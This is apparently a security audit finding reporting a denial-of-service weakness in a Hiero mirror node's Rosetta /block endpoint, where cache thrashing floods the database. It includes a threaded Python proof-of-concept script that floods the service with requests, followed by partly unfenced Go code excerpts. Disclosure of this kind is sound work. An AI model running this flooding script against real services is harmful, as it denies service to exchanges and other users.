### Title
LRU Cache Thrashing via Unauthenticated `/block` Requests Saturates Database in `updateOperationAccountAlias`

### Summary
The `updateOperationAccountAlias` function in `rosetta/app/services/block_service.go` performs a synchronous DB query (`GetAccountAlias`) for every operation whose account ID is not found in a process-wide LRU cache (default capacity 524,288). The Rosetta service has no application-level rate limiting, and the Traefik infrastructure middleware (rate limit, inFlightReq) is disabled by default (`global.middleware: false`). An unprivileged attacker can cycle requests across blocks whose combined unique account IDs exceed the cache capacity, causing perpetual cache eviction and a DB query per operation per request, saturating the database connection pool.

### Finding Description

**Exact code path:**

`rosetta/app/services/block_service.go` lines 104–130 — `updateOperationAccountAlias`:

```go
if cached, found = s.entityCache.Get(accountId.GetId()); !found {
    result, err := s.accountRepo.GetAccountAlias(ctx, accountId)   // DB hit
    ...
    s.entityCache.Set(result.GetId(), result)
}
```

The LRU cache is constructed in `NewBlockAPIService` (lines 34–37):

```go
entityCache := cache.NewContext(
    serverContext,
    cache.AsLRU[int64, types.AccountId](lru.WithCapacity(entityCacheConfig.MaxSize)),
)
```

Default `MaxSize` is **524,288** (`hiero.mirror.rosetta.cache.entity.maxSize`, docs line 654). Every cache miss calls `accountRepository.GetAccountAlias` (lines 109–136 of `rosetta/app/persistence/account.go`), which executes:

```sql
select alias, id from entity where id = @id
```

**Root cause:** The LRU cache is finite and shared across all concurrent requests. There is no application-level rate limiting in the Rosetta Go service (the middleware directory contains only health, metrics, and trace handlers). The Traefik middleware chain (inFlightReq: 5, rateLimit: average 10) is gated behind `global.middleware: false` (values.yaml line 95), so it is **off by default**.

**Exploit flow:**

1. Attacker enumerates blocks on the public Hedera network that contain many transfers (each transfer = one operation = one account ID lookup).
2. Attacker selects a set of blocks B₁…Bₖ whose combined unique account IDs total > 524,288.
3. Attacker sends rapid POST requests to `/block` cycling through B₁…Bₖ repeatedly.
4. Each cycle evicts the previous cycle's entries from the LRU cache.
5. Every operation in every block triggers `GetAccountAlias` → raw SQL → DB connection consumed.
6. With the DB pool capped at `maxOpenConnections: 100` (docs line 660), the pool saturates; legitimate requests queue or time out.

**Why existing checks fail:**

- The LRU cache itself is the only defense, but it is bounded and eviction-based — it provides no protection once the working set exceeds capacity.
- The Traefik middleware is opt-in and off by default.
- There is no per-IP, per-endpoint, or global request throttle inside the Go process.

### Impact Explanation
A sustained attack saturates the PostgreSQL connection pool (100 connections), causing DB query timeouts for all Rosetta API consumers. This degrades or denies service for block explorers, exchange integrations, and any Coinbase Rosetta-compatible tooling relying on this mirror node. Because the Rosetta API is used by exchanges to validate balances and construct transactions, availability loss directly affects asset custody operations on the network.

### Likelihood Explanation
The attack requires no credentials, no special knowledge beyond public block data, and no sophisticated tooling — a simple script cycling block index requests suffices. Hedera mainnet has tens of millions of accounts spread across millions of blocks, making it trivial to identify blocks with many unique account IDs. The attack is repeatable indefinitely and can be amplified by distributing requests across multiple source IPs to bypass any upstream IP-based rate limiting.

### Recommendation

1. **Add application-level rate limiting** inside the Rosetta Go service (e.g., `golang.org/x/time/rate` token bucket per IP or globally) before the block handler dispatches to `updateOperationAccountAlias`.
2. **Enable the Traefik middleware by default** (`global.middleware: true`) or document it as a required security control.
3. **Negative-cache misses**: currently accounts not found in the DB return `accountId` unchanged but are stored under `result.GetId()` — ensure these are also cached to avoid repeated DB hits for non-existent IDs.
4. **Bound per-request DB fan-out**: cap the number of distinct `GetAccountAlias` calls per single `/block` response (e.g., deduplicate account IDs before the loop).

### Proof of Concept

```python
import requests, itertools, threading

BASE = "http://<rosetta-host>:5700"
NETWORK = {"blockchain": "Hiero", "network": "mainnet"}

# Identify blocks with many transfers (high unique-account-ID count)
# Cycle through them to exceed the 524288-entry LRU cache
BLOCK_INDICES = list(range(1, 600_000, 1))  # adjust to real block range

def attack(indices):
    for idx in indices:
        try:
            requests.post(f"{BASE}/block", json={
                "network_identifier": NETWORK,
                "block_identifier": {"index": idx}
            }, timeout=5)
        except Exception:
            pass

# Launch concurrent threads to maximize DB connection consumption
threads = [threading.Thread(target=attack, args=(BLOCK_INDICES[i::8],)) for i in range(8)]
for t in threads: t.start()
for t in threads: t.join()
```

func (s *blockAPIService) updateOperationAccountAlias(
	ctx context.Context,
	transactions ...*types.Transaction,
) *rTypes.Error {
	for _, transaction := range transactions {
		operations := transaction.Operations
		for index := range operations {
			var cached types.AccountId
			var found bool

			accountId := operations[index].AccountId
			if cached, found = s.entityCache.Get(accountId.GetId()); !found {
				result, err := s.accountRepo.GetAccountAlias(ctx, accountId)
				if err != nil {
					return err
				}

				s.entityCache.Set(result.GetId(), result)
				cached = result
			}

			operations[index].AccountId = cached
		}
	}

	return nil
}
```

func (ar *accountRepository) GetAccountAlias(ctx context.Context, accountId types.AccountId) (
	zero types.AccountId,
	_ *rTypes.Error,
) {
	db, cancel := ar.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var entity domain.Entity
	if err := db.Raw(selectCryptoEntityWithAliasById, sql.Named("id", accountId.GetId())).First(&entity).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return accountId, nil
		}

		return zero, hErrors.ErrDatabaseError
	}

	if len(entity.Alias) == 0 {
		return accountId, nil
	}

	accountAlias, err := types.NewAccountIdFromEntity(entity)
	if err != nil {
		log.Warnf("Failed to create AccountId from alias '0x%s': %v", hex.EncodeToString(entity.Alias), err)
		return accountId, nil
	}

	return accountAlias, nil
}
```
